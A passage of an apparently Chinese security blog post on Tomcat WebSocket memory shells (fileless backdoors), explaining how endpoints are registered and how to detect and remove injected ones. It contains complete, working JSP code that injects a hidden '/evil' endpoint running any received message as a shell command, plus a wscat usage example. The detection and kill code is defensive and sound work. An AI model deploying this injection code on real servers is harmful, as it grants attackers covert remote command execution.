+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Java后端WebSocket的Tomcat实现&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">Welcome</span><br><span class="line">&lt;br/&gt;&lt;label <span class="keyword">for</span>=<span class="string">&quot;text&quot;</span>&gt;&lt;/label&gt;&lt;input id=<span class="string">&quot;text&quot;</span> type=<span class="string">&quot;text&quot;</span>/&gt;</span><br><span class="line">&lt;button onclick=<span class="string">&quot;send()&quot;</span>&gt;发送消息&lt;/button&gt;&lt;hr/&gt;</span><br><span class="line">&lt;button onclick=<span class="string">&quot;closeWebSocket()&quot;</span>&gt;关闭WebSocket连接&lt;/button&gt;&lt;hr/&gt;</span><br><span class="line">&lt;div id=<span class="string">&quot;message&quot;</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="type">let</span> <span class="variable">websocket</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 判断当前浏览器是否支持 WebSocket</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;WebSocket&#x27;</span> in window) &#123;</span><br><span class="line">        websocket = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&quot;ws://localhost:8080/TomcatShell_war_exploded/websocket&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        alert(<span class="string">&#x27;当前浏览器 Not support websocket&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 连接发生错误的回调方法</span></span><br><span class="line">    websocket.onerror = function () &#123;</span><br><span class="line">        setMessageInnerHTML(<span class="string">&quot;WebSocket连接发生错误&quot;</span>);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 连接成功建立的回调方法</span></span><br><span class="line">    websocket.onopen = function () &#123;</span><br><span class="line">        setMessageInnerHTML(<span class="string">&quot;WebSocket连接成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接收到消息的回调方法</span></span><br><span class="line">    websocket.onmessage = function (event) &#123;</span><br><span class="line">        setMessageInnerHTML(event.data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 连接关闭的回调方法</span></span><br><span class="line">    websocket.onclose = function () &#123;</span><br><span class="line">        setMessageInnerHTML(<span class="string">&quot;WebSocket连接关闭&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 监听窗口关闭事件，当窗口关闭时，主动去关闭 WebSocket 连接，防止连接还没断开就关闭窗口，server 端会抛异常</span></span><br><span class="line">    window.onbeforeunload = function () &#123;</span><br><span class="line">        closeWebSocket();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将消息显示在网页上</span></span><br><span class="line">    function <span class="title function_">setMessageInnerHTML</span><span class="params">(innerHTML)</span> &#123;</span><br><span class="line">        document.getElementById(<span class="string">&#x27;message&#x27;</span>).innerHTML += innerHTML + <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭 WebSocket 连接</span></span><br><span class="line">    function <span class="title function_">closeWebSocket</span><span class="params">()</span> &#123;</span><br><span class="line">        websocket.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送消息</span></span><br><span class="line">    function <span class="title function_">send</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">const</span> <span class="variable">message</span> <span class="operator">=</span> document.getElementById(<span class="string">&#x27;text&#x27;</span>).value;</span><br><span class="line">        websocket.send(message);</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>访问：<code>http://localhost:8080/TomcatShell_war_exploded/WebSocket/demo.jsp</code>（注意修改路径），可以模拟多个用户登陆的情况（也可以直接用 wscat 等工具连接 WebSocket 服务器），效果如图：</p>
+<p><img src="/image/post/2023/04/Demo.png" alt="Demo"></p>
+<h3 id="加载过程"><a href="#加载过程" class="headerlink" title="加载过程"></a>加载过程</h3><p>Tomcat 提供了一个<code>javax.servlet.ServletContainerInitializer</code>的实现类<code>org.apache.tomcat.websocket.server.WsSci</code>，<strong>Tomcat 的 WebSocket 加载是通过 SCI 机制完成的</strong>，WsSCI 可以处理的类型有三种：</p>
+<ul>
+<li>添加了注解<code>@ServerEndpoint</code>的类</li>
+<li>Endpoint 的子类</li>
+<li>ServerApplicationConfig 的实现类</li>
+</ul>
+<p>Tomcat 在 Web 应用启动时会在 StandardContext 的 startInternal 方法里通过 WsSci 的 onStartup 方法初始化 Listener 和 servlet，再扫描 classpath下带有注解<code>@ServerEndpoint</code>的类和 Endpoint 子类</p>
+<p>如果当前应用存在 ServerApplicationConfig 实现，则通过 ServerApplicationConfig 获取 Endpoint 子类的配置（ServerEndpointConfig 实例，包含了请求路径等信息）和符合条件的注解类，通过调用 addEndpoint 将结果注册到 WebSocketContainer 上；如果当前应用没有定义 ServerApplicationConfig 的实现类，那么 WsSci 默认只将所有扫描到的注解式 Endpoint 注册到 WebSocketContainer。因此，如果采用可编程方式定义 Endpoint，那么必须添加 ServerApplicationConfig 实现</p>
+<p>然后 startInternal 方法里为 ServletContext 添加一个过滤器<code>org.apache.tomcat.websocket.server.WsFilter</code>，它用于判断当前请求是否为 WebSocket 请求，以便完成握手（所以任何 Tomcat 都可以用 <a target="_blank" rel="noopener" href="https://github.com/c0ny1/java-memshell-scanner">java-memshell-scanner</a> 看到 WsFilter）</p>
+<p>既然要插入恶意 Filter，那么我们就需要在 Tomcat 启动过程中寻找添加 FIlter 的方法，而 filterDef、filterMap、filterConfigs 都是 StandardContext 对象的属性，并且也有相应的 add 方法，那么我们就需要先获取 StandardContext，再调用相应的方法</p>
+<p>WebSocket 内存马也很类似，上一节提到了 WsSci 的 onStartup 扫描 classpath 下带有注解<code>@ServerEndpoint</code>的类和 Endpoint 子类，并且调用 addEndpoint 方法注册到 WebSocketContainer 上。那么我们应该从 WebSocketContainer 出发，而 WsServerContainer 是在 StandardContext 里面创建的，那么，显而易见的：</p>
+<ol>
+<li>获取当前的 StandardContext</li>
+<li>通过 StandardContext 获取 ServerContainer</li>
+<li>定义一个恶意类，并创建一个 ServerEndpointConfig，给这个恶意类分配 URL Path</li>
+<li>调用<code>ServerContainer.addEndpoint</code>方法，将创建的 ServerEndpointConfig 添加进去</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServerContainer</span> <span class="variable">container</span> <span class="operator">=</span> (ServerContainer) req.getServletContext().getAttribute(ServerContainer.class.getName());</span><br><span class="line"><span class="type">ServerEndpointConfig</span> <span class="variable">config</span> <span class="operator">=</span> ServerEndpointConfig.Builder.create(evil.class, <span class="string">&quot;/ws&quot;</span>).build();</span><br><span class="line">container.addEndpoint(config);</span><br></pre></td></tr></table></figure>
+
+<p>上面的代码片段是整体思想的展示，下面的展示了这种木马：</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.websocket.server.ServerEndpointConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.websocket.server.ServerContainer&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.websocket.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">C</span> <span class="keyword">extends</span> <span class="title class_">Endpoint</span> <span class="keyword">implements</span> <span class="title class_">MessageHandler</span>.Whole&lt;String&gt; &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> Session session;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onMessage</span><span class="params">(String s)</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Process process;</span><br><span class="line"></span><br><span class="line">                <span class="type">boolean</span> <span class="variable">bool</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().startsWith(<span class="string">&quot;windows&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (bool) &#123;</span><br><span class="line">                    process = Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, s&#125;);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    process = Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, s&#125;);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">int</span> i;</span><br><span class="line">                <span class="keyword">while</span> ((i = inputStream.read()) != -<span class="number">1</span>)</span><br><span class="line">                    stringBuilder.append((<span class="type">char</span>)i);</span><br><span class="line">                inputStream.close();</span><br><span class="line"></span><br><span class="line">                process.waitFor();</span><br><span class="line">                session.getBasicRemote().sendText(stringBuilder.toString());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">                exception.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onOpen</span><span class="params">(<span class="keyword">final</span> Session session, EndpointConfig config)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.session = session;</span><br><span class="line">            session.addMessageHandler(<span class="built_in">this</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// String path = request.getParameter(&quot;path&quot;);</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;/evil&quot;</span>;</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">ServerEndpointConfig</span> <span class="variable">configEndpoint</span> <span class="operator">=</span> ServerEndpointConfig.Builder.create(C.class, path).build();</span><br><span class="line">    <span class="type">ServerContainer</span> <span class="variable">container</span> <span class="operator">=</span> (ServerContainer) servletContext.getAttribute(ServerContainer.class.getName());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (servletContext.getAttribute(path) == <span class="literal">null</span>) &#123;</span><br><span class="line">            container.addEndpoint(configEndpoint);</span><br><span class="line">            servletContext.setAttribute(path, path);</span><br><span class="line">        &#125;</span><br><span class="line">        out.println(<span class="string">&quot;success, connect url path: &quot;</span> + servletContext.getContextPath() + path);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        out.println(e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>先访问对应的路径（就是上面 JSP 所在的路径）把内存马激活加载进 Tomcat，然后使用 wscat 进行连接：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wscat -c ws://localhost:8080/TomcatShell_war_exploded/evil</span><br><span class="line">Connected (press CTRL+C to quit)</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">calc</span></span><br><span class="line">&lt;</span><br></pre></td></tr></table></figure>
+
+<p>注意路径、端口号和协议，使用 Java 而不是 JSP 也是可以注入的，其他地方都相似，重点在于 servletContext 的获取和激活注入内存马</p>
+<h3 id="内存马查杀"><a href="#内存马查杀" class="headerlink" title="内存马查杀"></a>内存马查杀</h3><p>我们可以先来使用 Java 自带的 JVM 内存查看工具 HSDB 来 dump 出内存马的字节码，这个工具在 Java 根目录的 lib 目录下，我们进入那个目录，使用命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp sa-jdi.jar sun.jvm.hotspot.HSDB</span><br></pre></td></tr></table></figure>
+
+<p>打开这个工具，在 File 下拉菜单里选择附加到进程，输入 Java 的进程号，然后在 Tools 下拉菜单选择 Class Browser，搜索<code>Endpoint</code>：</p>
+<p><img src="/image/post/2023/04/HSDB.png" alt="HSDB"></p>
+<p>可以看到第一个类<code>public abstract class javax.websocket.Endpoint</code>，我们点进去，再选择<code>View Class Hierarchy</code>：</p>
+<p><img src="/image/post/2023/04/Find.png" alt="Find"></p>
+<p>可以看到一个类<code>WebSocket.Evil</code>，这就是我们的内存马，可以点击去然后选择<code>Create .class File</code>，这样就拿到了我们的内存马的字节码（在 Java 根目录下），然后就可以反编译进行分析了，这里还有一种方法，可以更快的查杀内存马：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> WebSocket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.server.ServerContainer;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.server.ServerEndpointConfig;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ConcurrentHashMap;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(urlPatterns = &quot;/ws/find&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Find</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        List&lt;ServerEndpointConfig&gt; configs;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            configs = getEndpointConfigs(req);</span><br><span class="line">            <span class="keyword">for</span> (ServerEndpointConfig cfg : configs) &#123;</span><br><span class="line">                resp.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">                <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line">                out.println(<span class="string">&quot;&lt;h3&gt;Path: &quot;</span> + cfg.getPath() + <span class="string">&quot;&lt;/h3&gt;&quot;</span>);</span><br><span class="line">                out.println(<span class="string">&quot;&lt;p&gt;name: &quot;</span> + cfg.getEndpointClass().getName() + <span class="string">&quot;&lt;/p&quot;</span>);</span><br><span class="line">                out.println(<span class="string">&quot;&lt;p&gt;classloader name: &quot;</span> + cfg.getEndpointClass().getClassLoader().getClass().getName() + <span class="string">&quot;&lt;/p&gt;&quot;</span>);</span><br><span class="line">                out.println(<span class="string">&quot;&lt;a href=http://localhost:8080/TomcatShell_war_exploded/WebSocket/dump.jsp?class=&quot;</span> + cfg.getEndpointClass().getName() + <span class="string">&quot;&gt;dump&lt;/a&gt;&quot;</span>);</span><br><span class="line">                out.println(<span class="string">&quot;&lt;a href=http://localhost:8080/TomcatShell_war_exploded/WebSocket/dump.jsp?kill=&quot;</span> + cfg.getPath() + <span class="string">&quot;&gt;kill&lt;/a&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> List&lt;ServerEndpointConfig&gt; <span class="title function_">getEndpointConfigs</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ServerContainer</span> <span class="variable">sc</span> <span class="operator">=</span> (ServerContainer) request.getServletContext().getAttribute(ServerContainer.class.getName());</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_configExactMatchMap</span> <span class="operator">=</span> sc.getClass().getDeclaredField(<span class="string">&quot;configExactMatchMap&quot;</span>);</span><br><span class="line">        _configExactMatchMap.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ConcurrentHashMap</span> <span class="variable">configExactMatchMap</span> <span class="operator">=</span> (ConcurrentHashMap) _configExactMatchMap.get(sc);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">_ExactPathMatch</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.tomcat.websocket.server.WsServerContainer$ExactPathMatch&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">_getConfig</span> <span class="operator">=</span> _ExactPathMatch.getDeclaredMethod(<span class="string">&quot;getConfig&quot;</span>);</span><br><span class="line">        _getConfig.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        List&lt;ServerEndpointConfig&gt; configs = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        Iterator&lt;Map.Entry&lt;String, Object&gt;&gt; iterator = configExactMatchMap.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">            Map.Entry&lt;String, Object&gt; entry = iterator.next();</span><br><span class="line">            <span class="type">ServerEndpointConfig</span> <span class="variable">config</span> <span class="operator">=</span> (ServerEndpointConfig) _getConfig.invoke(entry.getValue());</span><br><span class="line">            configs.add(config);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> configs;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>另一个文件<code>WebSocket/dump.jsp</code>：</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;com.sun.org.apache.bcel.internal.Repository&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.net.URLEncoder&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.websocket.server.WsServerContainer&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.websocket.server.ServerContainer&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// dump 部分的代码需要写在 JSP 里，否则部分情况下会找不到要 dump 的 class</span></span><br><span class="line">    <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;class&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;class&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] classBytes = Repository.lookupClass(Class.forName(className)).getBytes();</span><br><span class="line">            response.addHeader(<span class="string">&quot;content-Type&quot;</span>, <span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> Class.forName(className).getSimpleName() + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">agent</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;User-Agent&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (agent.toLowerCase().indexOf(<span class="string">&quot;chrome&quot;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                response.addHeader(<span class="string">&quot;content-Disposition&quot;</span>, <span class="string">&quot;attachment;filename=&quot;</span> + <span class="keyword">new</span> <span class="title class_">String</span>(filename.getBytes(<span class="string">&quot;UTF-8&quot;</span>), <span class="string">&quot;ISO8859-1&quot;</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                response.addHeader(<span class="string">&quot;content-Disposition&quot;</span>, <span class="string">&quot;attachment;filename=&quot;</span> + URLEncoder.encode(filename, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">ServletOutputStream</span> <span class="variable">outDumper</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line">            outDumper.write(classBytes, <span class="number">0</span>, classBytes.length);</span><br><span class="line">            outDumper.close();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;kill&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">webSocket</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;kill&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">        <span class="type">WsServerContainer</span> <span class="variable">wsServerContainer</span> <span class="operator">=</span> (WsServerContainer) servletContext.getAttribute(ServerContainer.class.getName());</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; obj = Class.forName(<span class="string">&quot;org.apache.tomcat.websocket.server.WsServerContainer&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getDeclaredField(<span 